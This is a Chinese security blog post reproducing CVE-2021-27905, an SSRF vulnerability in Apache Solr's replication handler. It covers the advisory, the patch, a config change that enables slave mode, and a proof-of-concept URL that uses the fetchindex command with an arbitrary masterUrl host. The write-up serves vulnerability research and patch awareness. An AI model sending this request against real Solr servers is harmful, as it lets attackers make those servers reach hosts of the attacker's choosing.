# CVE-2021-27905 Apache Solr SSRF 复现

阅读量 **259492**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-14 14:30:36

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 漏洞分析

<https://github.com/apache/solr-site/blob/eb060a0d2cf1d31de403665407fff7a0255578ec/content/solr/security/2021-04-12-cve-2021-27905.md>

相应的补丁：  
<https://github.com/apache/solr/pull/47/files/c12bbae4da0719435cf5e19623f6dad83f0c8c65#diff-838f63a8d7b764661b66c758c19cfe6f3d6454b328a1b5f52f75480530b0cfe7>

根据补丁以及漏洞描述可以确定 bug 出在当进行 replication 操作时对传入的 masterUrl 参数 Solr
未对其做白名单过滤导致，补丁则是增加了对该参数的过滤。

构造PoC过程中主要参考文档：  
<https://solr.apache.org/guide/6_6/index-replication.html>

这里基本已经说明什么情况下才需要传masterUrl了

![](https://p4.ssl.qhimg.com/t01ceb396f87b56b54f.png)

然后根据command=fetchindex和masterUrl就可以得到PoC的格式

[http://127.0.0.1:8983/solr/db/replication?command=fetchindex&masterUrl=http://xxx](http://127.0.0.1:8983/solr/db/replication?command=fetchindex&masterUrl=http://xxx)

紧急分析出PoC后又看了下这里的功能是在干嘛，solr
支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。

根据文档要复现这个漏洞需要将本地的Solr作为slave，默认solr就有多个core，这里选定任意一个db

![](https://p2.ssl.qhimg.com/t01ed5879ae50725bd9.png)

根据路径修改它的solrconfig.xml(配置文件)，添加如下代码：

    
    
    <requestHandler name="/replication" class="solr.ReplicationHandler" >
        <lst name="slave">
          <str name="masterUrl">http://localhost/solr/db</str>
          <str name="pollInterval">00:00:20</str>
        </lst>
      </requestHandler>
    

因为PoC 会传入masterUrl，所以这里masterUrl就随便写的。PoC:

    
    
    http://127.0.0.1:8983/solr/db/replication\?command=fetchindex\&masterUrl=http://xxxx:9999
    

## 复现结果：

![](https://p2.ssl.qhimg.com/t012f162fe84a2e7400.png)

## 限制

所以这个漏洞的限制条件也就显而易见了：  
1、Solr 必须配置主从模式  
2、受影响的是从(slave)服务器

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **长亭移动小组** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/238201](/post/id/238201)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SSRF](/tag/SSRF)
  * [Web安全](/tag/Web安全)
  * [Apache Solr](/tag/Apache Solr)

 **+1** __3赞

 __收藏

![](https://p0.ssl.qhimg.com/t017b32d9af3df2fc6f.png) 长亭移动小组

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

